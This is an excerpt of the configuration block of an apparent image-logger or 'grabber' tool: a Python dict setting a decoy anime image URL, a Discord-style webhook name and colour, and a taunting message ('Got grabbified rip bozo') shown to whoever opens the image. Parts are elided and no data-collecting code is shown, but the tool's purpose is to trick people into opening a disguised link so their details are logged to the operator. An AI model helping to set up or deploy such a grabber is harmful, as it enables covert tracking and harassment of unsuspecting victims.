...
config = {
    ...
    "image": "https://www.db-z.com/wp-content/uploads/2021/12/Goku-Super-Saiyan-Blue-Evolue-4.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "LTX", # Set this to the name you want the webhook to have
    "color": 0xE2ED80, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "Got grabbified rip bozo 💀", # Message to show
